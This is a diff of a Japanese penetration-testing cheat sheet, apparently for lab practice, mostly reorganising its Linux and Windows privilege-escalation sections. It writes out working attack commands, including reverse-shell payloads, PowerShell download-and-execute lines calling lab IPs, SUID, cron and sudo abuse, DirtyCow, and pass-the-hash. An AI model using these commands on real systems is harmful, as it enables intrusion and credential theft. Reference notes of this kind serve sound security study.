@@ -11,11 +11,14 @@ kali@kali:$ sudo nmap -sC -sV -oN nmap/initial 10.10.10.1
 kali@kali:$ sudo nmap -T5 -p- -oN nmap/full 10.10.10.1
 ```
 ```
+kali@kali:$ sudo nmap --min-rate=10000 -p- -v 10.10.10.1
+```
+```
 kali@kali:$ sudo nmap 10.10.10.1 -v -p- --min-rate=10000
 (上記の結果を元に)kali@kali:$ sudo nmap -sC -sV -oN nmap/initial -v -p 22,80,3000
 ```
 ```
-ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.1 | grep ^[0-9] | cut -d '/' -f 1 | tr
+ports=$(nmap -p- --min-rate=10000 -T4 10.10.10.1 | grep ^[0-9] | cut -d '/' -f 1 | tr
 '\n' ',' | sed s/,$//)
 nmap -p$ports -sV -sC 10.10.10.242
 ```
@@ -66,7 +69,7 @@ PORT   STATE SERVICE
 
 ## Masscan
 Massscanはインターネット全体を約6分でスキャンし、1秒間に1000万パケットという驚異的な数のパケットを送信する最速のポートスキャナー。  
-raw socketsの権限を必要とするためsudoを用いる。　　
+raw socketsの権限を必要とするためsudoを用いる。  
 下記のコマンドではTCPポート80が空いているホストをclass Aサブネットで列挙している。
 ```
 kali@kali:~$ sudo masscan -p80 10.0.0.0/8
@@ -1075,10 +1078,19 @@ hashcat -m 0 -a 0 <パスワードファイル>　/usr/share/wordlist/rockyou.tx
 - -m 0 = MD5
 - -a 0 = 辞書攻撃
 
-Hash tyep:
+Hash type:
 https://hashcat.net/wiki/doku.php?id=example_hashes
 
-## hydra
+### hashcat(ルールベース攻撃)
+hashcatを利用して、キーワードを元にルールを用いてワードリストを作成することができる。  
+ルールは自分で作成することも可能だが、/usr/share/hashcat/rulesを用いることで簡単にワードリストを作成することが可能。
+```
+hashcat -r /usr/share/hashcat/rules/best64.rule --stdout keyword.txt
+```
+hashcat:Rule-based Attack  
+https://hashcat.net/wiki/doku.php?id=rule_based_attack
+
+## Hydra
 - -l...単一のユーザー名の指定
 - -L...ユーザーリストファイルの指定
 - -p...単一のパスワードの指定
@@ -1147,8 +1159,8 @@ patator ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x igno
 /usr/share/seclists/Discoavery/DNS
 ```
 
-## Wordlistの作成
-### CeWL
+### Wordlistの作成
+#### CeWL
 指定されたURLを指定された深さまでスパイダーして単語リストを作成するツール。
 ```
 cewl https://test.com/ -w dict.txt
@@ -1156,28 +1168,19 @@ cewl https://test.com/ -w dict.txt
 - -w...ファイルに出力
 - -d...ディレクトリの深さの指定
 
-### crunch
+#### crunch
 自動で全ての組み合わせを出力するツール。  
 下記の例では、最小2文字から最大3文字のワードリストを作成する。
 ```
 crunch 2 3 -o dict.txt
 ```
 
-### cupp
+#### cupp
 対話形式で個人をプロファイリングすることで、ワードリストを作成する。  
 誕生日、ニックネーム、ペットの名前などを対話形式で答えていく。
 ```
 cupp -i
 ```
-
-### hashcat(ルールベース攻撃)
-hashcatを用いて、キーワードを元にルールを用いてワードリストを作成することができる。  
-ルールは自分で作成することも可能だが、/usr/share/hashcat/rulesを用いることで簡単にワードリストを作成することが可能。
-```
-hashcat -r /usr/share/hashcat/rules/best64.rule --stdout keyword.txt
-```
-hashcat:Rule-based Attack  
-https://hashcat.net/wiki/doku.php?id=rule_based_attack
 
 ## base64,16進数 → テキスト
 ```
@@ -1201,23 +1204,21 @@ airodump-ng --channel 対象のチャンネル --bssid APのMACアドレス -w <
 aircrack-ng <filename>.cap
 ```
 
-# Privilege Escalation
-## Linux
-### チェック項目
+# Privilege Escalation(Linux)
+## チェック項目
 - tty shell
-- linpeas.shの実行(列挙)
-- カーネルバージョンの確認(uname -a)
-- sudoコマンドの権限確認(sudo -l)
-- cronジョブの確認(crontab，systemd timer)
-- SUID(find / -perm -u=s -type f 2>/dev/null)
+- linpeas.shの実行(自動列挙)
+- ファイル権限の不備(/etc/passwd, /etc/shadow)
+- sudoを悪用した権限昇格(sudo -l)
+- Cron Jobsの確認(cat /etc/crontab)
+- SUIDバイナリを悪用した権限昇格(find / -perm -u=s -type f 2>/dev/null)
+- 端末内に残されているpasswordの探索(historyファイル, Webアプリケーションのソースコードやデータベース内の認証情報, .sshディレクトリ内のSSH秘密鍵)
+- NFSを介した権限昇格
 - 開いているポートの確認(netstat -tulpn)
-- 実行中のプロセスの確認(ps -aux，pspy)
-- パスワードがWebアプリケーションのスクリプトにハードコーディングされていないか確認
-- pspyを使用してuid=0(root権限)で定期的に実行されているスクリプトがないか確認
-- その他テクニック
+- 実行中のプロセスの確認(ps -aux，pspyを使用してuid=0<root権限>で定期的に実行されているスクリプトがないか確認)
+- Kernel Exploit(uname -a, linux-exploit-suggester-2)
 
-
-### tty shell
+## tty shell
 ```
 #bashが制限されている場合はsh
 python -c 'import pty;pty.spawn("/bin/bash")'
@@ -1250,7 +1251,7 @@ export TERM=xterm-256color
 stty rows <num> columns <cols>
 ```
 
-### Service Exploits(MySQL)
+## Service Exploits(MySQL)
 MySQLがrootとして実行されており、rootユーザーにパスワードが割り当てられていない時、以下のエクスプロイトを使用することでroot権限を取得することができる。  
 https://www.exploit-db.com/exploits/1518
 まずは、raptor_udf2.cエクスプロイトコードをコンパイルする。
@@ -1279,7 +1280,7 @@ MySQLシェルを終了して下記のコマンドを入力する。
 ```
 /tmp/rootbash -p
 ```
-### Weak File Permissions - Readable /etc/shadow
+## Weak File Permissions - Readable /etc/shadow
 /etc/shadowファイルにはユーザーパスワードハッシュが記述されている。  
 通常はrootユーザーのみが読み取ることができるが、設定ミスなどにより一般ユーザーでも読み取り可能なことがある。  
 まずは、読み取り可能かファイルの権限を確認する。
@@ -1308,7 +1309,7 @@ root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-### Weak File Permissions - Writable /etc/shadow
+## Weak File Permissions - Writable /etc/shadow
 設定ミスなどにより、/etc/shadowファイルが書き込み可能である場合、rootのパスワードハッシュを自身で作成したものに置き換えて権限昇格することが可能である。
 ```
 ls -l /etc/shadow
@@ -1322,7 +1323,7 @@ $6$xmmQPckNVPWL/VVF$wMS2EIY2jmISe6X2mcuBWo9aWLRg9/TaDhOLK/ZjS1197OSL7LugJIf4JXIh
 ```
 その後、/etc/shadowのパスワードハッシュを上記のハッシュに書き換えて、rootユーザーに切り替える。
 
-### Weak File Permissions - Writable /etc/passwd
+## Weak File Permissions - Writable /etc/passwd
 /etc/passwdファイルには、ユーザーアカウントに関する情報が含まれている。これは誰でも読み取り可能になっているが、書き込みは通常rootユーザのみとなる。  
 しかし設定ミスなどにより、/etc/passwdファイルが書き込み可能である場合、rootのパスワードハッシュを自身で作成したものに置き換えて権限昇格することが可能である。
 ```
@@ -1337,14 +1338,14 @@ openssl passwd <パスワードにしたい好きな文字列>
 
 または、rootユーザーの行をコピーして、ファイルの最後に追加して、新たなrootユーザーとパスワードを設定することも可能である。
 
-### Sudo - Shell Escape Sequences
+## Sudo - Shell Escape Sequences
 sudo権限で実行できるプログラムの一覧を表示する。
 ```
 sudo -l
 ```
 GTFOBins(https://gtfobins.github.io)にアクセスして、表示されたプログラムを利用することで権限昇格できるかを試みる。
 
-### Sudo - Environment Variables
+## Sudo - Environment Variables
 sudoはユーザーの環境から特定の環境変数を継承するように構成できる。  
 まずは、継承されている環境変数を確認する(env_keepオプションを探す)。
 ```
@@ -1423,7 +1424,7 @@ sudo LD_LIBRARY_PATH=/tmp apache2
 ```
 これにより、GTFOBinsに記載がないプログラムでもsudo -lによってリストされていた場合にrootシェルを取得することができる。
 
-### Cron Jobs - File Permissions
+## Cron Jobs - File Permissions
 cronジョブはユーザーが特定の時間または間隔で実行するようにスケジュールできるプログラムである。  
 cronテーブルファイル(crontabs)は、cronジョブの構成が記載されており、システム全体のcrontabは/etc/crontabにある。
 ```
@@ -1434,7 +1435,7 @@ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/nul
 ```
 上記のコマンドにより、スケジュールされたrootで実行されているcronジョブが存在し、現在のユーザー権限で書き込み可能なファイルがある場合、reverse shellペイロードを書き込むことでrootシェルを取得できる。
 
-### Cron Jobs - PATH Environment Variable
+## Cron Jobs - PATH Environment Variable
 crontabのPATH変数が、下記のoverwrite.shのように明示されていない場合、PATH変数に示されているパスに同じ名前のreverse shellファイルなどを配置することで、rootシェルを取得できる。
 ```
 user@debian:~/tools/sudo$ cat /etc/crontab
@@ -1453,7 +1454,7 @@ PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
 例えば、上記の結果の場合は/home/userディレクトリにreverse shellペイロードを記述したoverwrite.shを配置することでrootシェルを取得できる。
 
-### Cron Jobs - Wildcards
+## Cron Jobs - Wildcards
 /etc/crontabを確認した結果、下記のスクリプトがスケジュールさていてた場合
 ```
 user@debian:~$ cat /usr/local/bin/compress.sh
@@ -1474,7 +1475,7 @@ chmod +x /home/user/shell.elf
 cronジョブのtarコマンドが実行されると、ワイルドカード(*)によりこれらのファイルが含まれる。これらのファイル名は有効なtarコマンドラインのオプションであるため、tarはファイル名をコマンドオプションとして認識して、ファイル名ではなくコマンドラインオプションとして扱ってしまう。  
 これにより、shell.elfが実行されてrootシェルを取得することができる。
 
-#### Cron Jobs - Systemd Timers
+## Cron Jobs - Systemd Timers
 /etc/systemd/system/配下にファイルを配置されているファイルをチェック(見たことがないファイルが置かれていないか)
 - .service(定期実行するファイルのパスなどを記述)
 - .timer(時間間隔の指定)
@@ -1491,8 +1492,8 @@ sudo systemctl start datetest.service
 # Systemd Timerの起動
 sudo systemctl start datetest.timer
 ```
-### SUID/SGID Executables - Known Exploits
-SUIDはset user IDを表し、ユーザーはファイル所有者としてファイルを実行できる。   
+## SUID/SGID Executables - Known Exploits
+SUIDはSet User IDを表し、ユーザーはファイル所有者としてファイルを実行できる。   
 これを利用して、LinuxではSUIDビットが有効になってファイル所有者がrootになっている場合、既存のバイナリとコマンドの一部をroot以外のユーザーが使用して、rootアクセス権限を昇格させることができる。  
 下記のコマンドを実行するとSUIDアクセス許可を物全てのバイナリを列挙することができる。
 ```
@@ -1523,7 +1524,7 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 このソフトウェアには既知のエクスプロイトが存在する(CVE-2016-1531)。  
 これらを利用してエクスプロイトすることで権限昇格できる可能性がある。
 
-### SUID/SGID Executables - Shared Object Injection
+## SUID/SGID Executables - Shared Object Injection
 SUID実行可能ファイル(今回はsuid-soという名前の実行可能ファイル)が共有オブジェクトインジェクションに対して脆弱な場合、権限昇格できる可能性がある。  
 ファイルに対して、straceを実行して"open|access|no such file"を検索する。
 
@@ -1574,7 +1575,7 @@ suid-so実行可能ファイルを再度実行すると、rootシェルを取得
 /usr/local/bin/suid-so
 ```
 
-### SUID/SGID Executables - Environment Variables
+## SUID/SGID Executables - Environment Variables
 sudo・root権限で実行可能なスクリプト内(SUIDバイナリ)にserviceやcurl、gzip、psコマンドなどがフルパスなしで記述され実行されている場合、自分が用意したコマンド(/bin/shやreverse shellスクリプト)などを実行させるようにパスを書き換える。  
 今回、利用するバイナリは/usr/local/bin/suid-envとする。
 ```
@@ -1616,7 +1617,7 @@ export PATH=/tmp:$PATH
 whoami → root
 ```
 
-### SUID/SGID Executables - Abusing Shell Features (#1)
+## SUID/SGID Executables - Abusing Shell Features (#1)
 sudo・root権限で実行可能なスクリプト内(SUIDバイナリ)に絶対パスを使用してコマンドを実行していても、Bashのバージョン(<4.2-048)によって権限昇格できる可能性がある。  
 今回、利用するバイナリは/usr/local/bin/suid-env2とする。
 ```
@@ -1645,15 +1646,15 @@ export -f /usr/sbin/service
 ```
 最後にsuid-env2を実行して、rootシェルを取得する。
 
-### SUID/SGID Executables - Abusing Shell Features (#2)
+## SUID/SGID Executables - Abusing Shell Features (#2)
 *Bashのバージョンが4.4以降では機能しない。
 Bashデバッグを有効にし、PS4変数を/bin/bashのSUIDバージョンを作成する埋め込みコマンドに設定して/usr/local/bin/suid-env2実行可能ファイルを実行する。
 ```
 env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
 ```
 -pを指定して、/tmp/rootbash実行可能ファイルを実行して、rootシェルを取得する。
-### SUID/SGID Executables - Capability
-SUIDはset user IDを表し、ユーザーはファイル所有者としてファイルを実行できる。  
+## SUID/SGID Executables - Capability
+SUIDはSet User IDを表し、ユーザーはファイル所有者としてファイルを実行できる。  
 これはファイルの所有者の権限でプログラム/ファイルを実行するための一時的なアクセス権をユーザーに与えるものとして定義されている。  
 Capabilityは通常ルートに割り当てられているアクションを細かく分割して実行する仕組み。  
 これを利用することで、通常80番ポートなどの1024以下のポートでWebサーバーなどをリッスンさせるためにはルート権限が必要だが、Webサーバーデーモンにroot権限を与えるのではなく、CAP_NET_BIND_SERVICEなどのCapabilitiesを設定することで簡単に80番ポートを開放することができる。  
@@ -1671,7 +1672,7 @@ getcap -r / 2>/dev/null
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
 ```
 
-#### cap_setuid+ep
+### cap_setuid+ep
 ```
 python3:
 ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
@@ -1679,7 +1680,7 @@ perl:
 ./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
 ```
 
-#### cap_dac_read_search+ep
+### cap_dac_read_search+ep
 - tarを使用して/etc/shadowを圧縮
 - shadow.tarが生成される
 - shadow.tarを展開するとetc/shadowディレクトリが作成される
@@ -1690,7 +1691,7 @@ perl:
 cat etc/shadow
 ```
 
-### Passwords & Keys - History Files
+## Passwords & Keys - History Files
 ユーザーが誤ってパスワードプロンプトではなく、コマンドラインでパスワード入力した場合、パスワードは履歴ファイルに記録される可能性がある。  
 下記のコマンドを使用して、ユーザーのホームディレクトリにある全ての日表示の履歴ファイルの内容を表示する。
 ```
@@ -1698,12 +1699,12 @@ cat ~/.*history | less
 ```
 上記の結果より、パスワードらしきものが見つかればそれを利用してrootユーザーに切り替える。
 
-### Passwords & Keys - Config Files
+## Passwords & Keys - Config Files
 構成ファイルなどに、プレーンテキストや可逆形式のパスワードが含まれていることがある。  
 例えばWebアプリケーションのソースコードにハードコーディングされている場合や、MySQL内に保存されている場合、メモなどが残されている場合がある。  
 それらを利用して権限昇格できる可能性がある。
 
-### Passwords & Keys - SSH Keys
+## Passwords & Keys - SSH Keys
 .sshディレクトリなどに正しい権限が付与されていない場合、rootユーザーの秘密鍵などを読み取れる可能性がある。  
 この秘密鍵を利用して、rootユーザーとしてログインする。
 ```
@@ -1711,7 +1712,7 @@ chmod 600 id_rsa
 ssh -i id_rsa root@10.10.10.1
 ```
 
-### NFS
+## NFSを悪用した権限昇格
 NFSを介して作成されたファイルは、リモートユーザーのIDを継承する。  
 ユーザーがrootであり、rootスカッシングが有効になっている場合、IDは代わりに「nobody」ユーザーに設定される。
 ```
@@ -1736,15 +1737,15 @@ chmod +xs /tmp/nfs/shell.elf
 /tmp/shell.elf
 ```
 
-### Kernel Exploit
+## Kernel Exploit
 カーネルバージョンを確認して、カーネルエクスプロイトを用いて権限昇格
 ```
 uname -a
 ```
-linux-exploit-suggester2による自動列挙:
+linux-exploit-suggester2による自動列挙:  
 https://github.com/jondonas/linux-exploit-suggester-2
-#### Dirtycow
-・40839.c(dirty.c)
+### Dirtycow
+#### 40839.c(dirty.c)
 パスワードを自身で入力して、firefaltというアカウントを作成する。
 ```
 gcc -pthread dirty.c -o dirty -lcrypt
@@ -1762,7 +1763,7 @@ firefart:fijI1lDcvwk7k:0:0:pwned:/root:/bin/bash
 su firefart
 ```
 
-・40616.c(cowroot.c)  
+#### 40616.c(cowroot.c)  
 実行するだけでrootになれる
 ```
 gcc cowroot.c -o cowroot -pthread
@@ -1772,7 +1773,7 @@ gcc cowroot.c -o cowroot -pthread
 * root@box:/root/cow# id
 * uid=0(root) gid=1000(foo) groups=1000(foo)
 ```
-・c0w  
+#### c0w  
 https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54
 ```
 gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
@@ -1782,6 +1783,7 @@ gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
 /usr/bin/passwd
 ```
 
+## Tips
 ### ファイルの検索
 ```
 find / -name <ファイル名> -type f 2>>/dev/null
@@ -1790,8 +1792,6 @@ find / -name <ファイル名> -type f 2>>/dev/null
 - -name...名前の指定
 - -type f...ディレクトリではなく、ファイル検索を指定
 - 2>>/dev/null...全てのエラーを破棄
-
-
 
 ### 実行中のプロセスを確認
 ```
@@ -1828,7 +1828,7 @@ scriptmanager@bashed:/$ whoami
 scriptmanager
 ```
 
-#### PrivEsc - Enum tools(Linux)
+## PrivEsc - Enum tools(Linux)
 linpease.sh:  
 https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  
 
@@ -1851,172 +1851,11 @@ linux-exploit-suggester2:
 https://github.com/jondonas/linux-exploit-suggester-2
 
 
-## Windows
-### チェック項目
+# Windows
+## チェック項目
 []
 
-### 侵入先情報の列挙
-```
-systeminfo
-echo %username%
-```
-
-###  reverse_shell
-#### msfvenom
-```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f exe > shell.exe
-rlwrap nc -lvnp 4444
-```
-
-#### nishang
-```
-powershell iex (New-Object Net.WebClient).DownloadString('http://10.9.252.239:9999/nishang.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.9.252.239 -Port 4444
-
-rlwrap nc -lvnp 4444
-```
-
-#### netcatを転送
-```
-certutil.exe -urlcache -split -f "http://10.10.10.1/nc.exe" C:\Windows\Temp\nc.exe
-C:Windows\Temp\nc.exe -e cmd 10.10.10.1 4444
-```
-
-### ファイルのダウンロード
-```
-curl http://10.10.10.1:9000/putty.exe -o putty.exe
-certutil -urlcache -split -f "http://10.10.14.11:9000/rs.exe" rs.exe
-bitsadmin /transfer job /download /priority high http://10.10.14.17/nc.exe c:\temp\nc.exe
-powershell -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11:9000/rs.exe', 'rs.exe')
-powershell -c (Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe")
-powershell -c (wget "http://10.10.14.17/nc.exe" -outfile "c:\temp\nc.exe")
-powershell -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
-```
-
-#### ダウンロード&実行
-```
-powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.14.16:9001/nishang.ps1')"
-```
-```
-被害者(受信側):
-# 共有ディレクトリの列挙
-net view \\10.10.14.11
-# 共有ディレクトリ内のファイルを列挙
-dir \\10.10.10.1\temp
-# ローカルにコピー
-copy \\10.10.10.1\temp\rs.exe rs.exe
-```
-
-#### ファイルの検索
-```
-dir /s /b <ファイル名>
-dir /s /b flag*
-```
-- /s...サブフォルダまで含めたファイルまで検索対象とする
-- /b...ファイル名だけ表示
-
-#### SMBを用いたファイル共有
-```
-攻撃側(送信側):
-python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp .
-```
-
-### Powershell
-#### Powershellスクリプトの実行
-```
-現在のユーザーの実行ポリシーの確認:
-Get-ExecutionPolicy -Scope CurrentUser
-現在のユーザーの実行ポリシーの変更:
-Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
-```
-
-#### PowerUp.ps1
-```
-# Powershellの起動
-C:> powershell.exe -nop -exec bypass
-
-# PowerUpモジュールのインポート
-PS C:\> Import-Module PowerUp.ps1
-
-# PowerUpの実行(All-Check関数を使用)
-PS C:\> Invoke-AllChecks 
-```
-
-```
-# ワンライナー
-C:\> powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
-```
-```
-# ディスクに触れずにPowerUpを実行
-C:\> powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
-```
-
-### Tokenの偽装(token impersonation)
-```
-全ての権限を表示:
-whoami /priv
-```
-```
-一般的に悪用される特権の一覧:
-- SeImpersonatePrivilege
-- SeAssignPrimaryPrivilege
-- SeTcbPrivilege
-- SeBackupPrivilege
-- SeRestorePrivilege
-- SeCreateTokenPrivilege
-- SeLoadDriverPrivilege
-- SeTakeOwnershipPrivilege
-- SeDebugPrivilege
-```
-#### metasploit(token impersonation)
-```
-シークレットモードの読み込み:
-msf6 > load_incognito
-上記のコマンドで上手くいかない場合
-msf6 > use incognito
-
-偽装するトークン一覧を表示:
-msf6 > list_tokens -g
-トークンの偽装:
-msf6 > impersonate_token "BUILTIN\Administrators"
-トークン偽装後の権限確認:
-msf6 > getuid
-```
-
-高い特権トークンを持っていても、実際には特権ユーザーの権限を持っていない場合がある。  
-この場合、偽装トークン(なりすまし)ではなく、プライマリトークンを使用する必要がある。  
-選択するのに最も安全なプロセスはservices.exeプロセスである。
-```
-移行するプロセスを探すためにプロセス一覧の表示:
-(service.exeのプロセスを探すのが無難)
-msf6 > ps
-
-プロセスの移行:
-(service.exeのPIDなどを指定)
-msf6 > migrate <PID>
-```
-
-### metasploit(local_exploit_suggester)
-exploitをせずに脆弱性をチェックするために使用するモジュール。  
-meterpreterでシェルを取得している場合、これを使うことで特権昇格に使えるexploitを簡単に探すことができる。
-
-```
-msf6 > use post/multi/recon/local_exploit_suggester
-```
-
-### windows-exploit-suggester
-windowsでexploitを列挙するためのスクリプト
-systeminfoコマンドの出力が必要
-```
-./windows-exploit-suggester.py --update
-pip install xlrd
-```
-```
-systeminfo > systeminfo.txt
-./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
-```
-
-### Windowsサービスの悪用
-#### Windowsサービスの操作
+## Windowsサービスの悪用
 ```
 # 現在のユーザーに割り当てられている特権を確認
 whoami /priv
@@ -2074,12 +1913,12 @@ steelmountain\bill S-1-5-21-3029548963-3893655183-1231094572-1001
 これらの調査をPowerUp.ps1を利用すると簡便に確認することが可能である。
 ```
 
-#### Powershellを利用したサービスの列挙
+### Powershellを利用したWindowsサービスの列挙
 ```
 powershell -c "Get-Service"
 ```
 
-#### WMCIを利用したサービスの列挙
+### WMCIを利用したWindowsサービスの列挙
 ```
 wmic service list brief
 ```
@@ -2095,7 +1934,7 @@ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^
 for /f eol^=^"^ delims^=^" %a in (permissions.txt) do cmd.exe /c icacls "%a" >> path.txt
 ```
 
-#### sc.exeを利用したサービスの列挙
+### sc.exeを利用したWindowsサービスの列挙
 ```
 sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt
 
@@ -2109,10 +1948,10 @@ icacls "C:\path\to\file.exe"
 ```
 system32のバイナリは、Windowsによってインストールされるためほとんど正しいとして除外する。
 
-#### 安全でないサービスのプロパティ
+### 安全でないサービスのプロパティ
 Windowsの各サービスには、特定のサービス固有の各セス許可を定義するACL(アクセス制御リスト)がある。  
 侵入中のユーザ権限で下記のACL権限を持っている場合、権限をエスカレードできる可能性がある。  
-- SERVICE_STOP, SERVICE_START
+- SERVICE_STOP, SERVICE_START  
 - SERVICE_CHANGE, SERVICE_ALL_ACCESS
 ```
 accesschk.exe /accepteula
@@ -2122,7 +1961,7 @@ accesschk.exe -ucqv <Service Name>
 ```
 - /accepteula...EULA(ソフトウェア使用許諾契約)を省略
 
-### Service Exploits - Insecure Service Permissions(安全でないサービスパーミッション)
+## Service Exploits - Insecure Service Permissions(安全でないサービスパーミッション)
 「daclsvc」サービスに対する「user」アカウントの権限を確認する。
 ```
 accesschk.exe /accepteula -uwcqv user *
@@ -2143,7 +1982,7 @@ sc config daclsvc binpath= "\"C:\Windows\Temp\reverse.exe\""
 net start daclsvc
 ```
 
-### Service Exploits - Unquoted Service Path(引用符で囲まれていないサービスパス)
+## Service Exploits - Unquoted Service Path(引用符で囲まれていないサービスパス)
 サービスに使用される実行可能ファイルへのパスが引用符で囲まれていない場合に現れる脆弱性。  
 「unquotedsvc」サービスを照会して、システム特権(SERVICE_START_NAME)で実行されていることと、「BINARY_PATH_NAME」が引用符で囲まれておらずスペースが含まれていることを確認する。
 ```
@@ -2194,7 +2033,7 @@ sc stop AdvancedSystemcareservice9
 sc start AdvancedSystemcareservice9
 ```
 
-### Service Exploits - Weak Registry Permissions
+## Service Exploits - Weak Registry Permissions
 サービスを照会し、SYSTEM特権(SERVICE_START_NAME)で実行されていることを確認する。
 ```
 sc qc <Service Name>
@@ -2221,7 +2060,7 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\<Service Name> /v ImagePath /t RE
 net start <Service Name>
 ```
 
-### Service Exploits - Insecure Service Executables
+## Service Exploits - Insecure Service Executables
 サービスを照会し、SYSTEM特権(SERVICE_START_NAME)で実行されていることを確認する。
 ```
 sc qc <Service Name>
@@ -2239,7 +2078,7 @@ copy C:\PrivEsc\reverse.exe "C:\Program Files\<Service Name>\<Service(reverse sh
 net start <Service Name>
 ```
 
-### Registry - AutoRuns
+## Registry - AutoRuns
 レジストリにAutoRun実行可能ファイルを照会する。
 ```
 reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
@@ -2254,7 +2093,7 @@ shutdown /r /t 0
 その後、管理者権限でログインされる必要がある
 ```
 
-### Registry - AlwaysInstallElevated
+## Registry - AlwaysInstallElevated
 レジストリにAlwaysInstallElevatedキーを照会する。
 ```
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -2270,7 +2109,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o r
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
 
-### Passwords - Registry
+## Passwords - Registry
 レジストリ内に保存されているパスワードを検索する。
 ```
 # HKLM
@@ -2297,7 +2136,7 @@ winexeコマンド(LinuxからWindows上のコマンドを実行できるツー�
 winexe -U 'admin%password' //10.10.10.1 cmd.exe
 ```
 
-### Passwords - Saved Creds
+## Passwords - Saved Creds
 保存されている資格情報を一覧表示する。
 ```
 cmdkey /list
@@ -2307,7 +2146,7 @@ cmdkey /list
 ```
 runas /savecred /user:admin C:\PrivEsc\reverse.exe
 ```
-### Passwords - Security Account Manager (SAM)
+## Passwords - Security Account Manager (SAM)
 SAMファイルとSYSTEMファイルのバックアップを安全に保存されていない場合、これらのファイルを使用してユーザーのパスワードハッシュを抽出することができる。  
 ```
 # smbを利用したファイルの共有
@@ -2325,7 +2164,7 @@ hashcatを使用してNTLMハッシュをクラックする。
 hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
 ```
 
-### Passwords - Passing the Hash
+## Passwords - Passing the Hash
 ハッシュを使用して認証できるため、hashcatなどでパスワードクラックせずとも管理者ハッシュでログインできる。
 ```
 pth-winexe -U 'admin%<転んで区切られたLMハッシュとLTLMハッシュの両方が含まれているもの>' //10.10.10.1 cmd.exe
@@ -2333,7 +2172,7 @@ pth-winexe -U 'admin%<転んで区切られたLMハッシュとLTLMハッシュ�
 例)
 pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.12.15 cmd.exe
 ```
-### Scheduled Tasks
+## Scheduled Tasks
 スケジュールされているスクリプトがSYSTEM権限で実行されており、ファイルに書き込み権限がある場合、reverse shellペイロードを実行するようにスクリプトを書き換えてやることでSYSTEM権限のシェルを取得することができる。
 ```
 # スケジュールの一覧を表示
@@ -2352,7 +2191,7 @@ echo C:\Windows\Temp\reverse.exe >> C:\Users\user\Desktop\task.ps1
 ```
 netcatでlistenしておき、スケジュールされたタスクが実行されるのを待ち、システム権限のシェルを取得する。
 
-### Insecure GUI Apps
+## Insecure GUI Apps
 RDP(リモートデスクトップ)などでアクセスした際に、管理者権限で実行できるソフトウェアがある場合、それらを介してcmd.exeを起動することでSYTEM権限のシェルを取得する。  
 例えば、管理者権限で動作するペイントを仮定する。  
 ```
@@ -2362,7 +2201,7 @@ tasklist /V | findstr mspaint.exe
 ペイントの[ファイル]→[開く]を押下して、file://c:/windows/system32/cmd.exeを開く。  
 これにより、SYSTEM権限のシェルを取得することができる。
 
-### Startup Apps
+## Startup Apps
 accesschk.exeを使用してBUILTIN\UsersグループがStartUpデディレクトリにファイルを書き込むことができることを確認。
 ```
 accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
@@ -2380,7 +2219,7 @@ oLink.Save
 cscript shortcut.vbs
 ```
 
-### Token Impersonation - Rogue Potato
+## Token Impersonation - Rogue Potato
 socatリダイレクタを設定して、kaliの135番ポートをWindowsの9999に転送する。
 ```
 sudo socat tcp-listen:135,reuseaddr,fork tcp:<Target IP>:9999
@@ -2432,7 +2271,7 @@ Hot、Rotten、Lonely、Juicy、Rogueは、ポテトエクスプロイトのフ�
 攻撃対象のマシンが >= Windows 10 1809 & Windows Server 2019 の場合 - Rogue Potato を試してみてください。
 攻撃対象のマシンが < Windows 10 1809 < Windows Server 2019 の場合 - Juicy Potato を試してみてください。
 ```
-### Token Impersonation - PrintSpoofer
+## Token Impersonation - PrintSpoofer
 まずは、netcatでlistenしておき管理者ユーザーとしてRDPにログインし、管理者コマンドプロンプトを起動する。(右クリックして管理者として実行)  
 PSEexec64.exeを使用してlocal serviceアカウントを取得する。
 ```
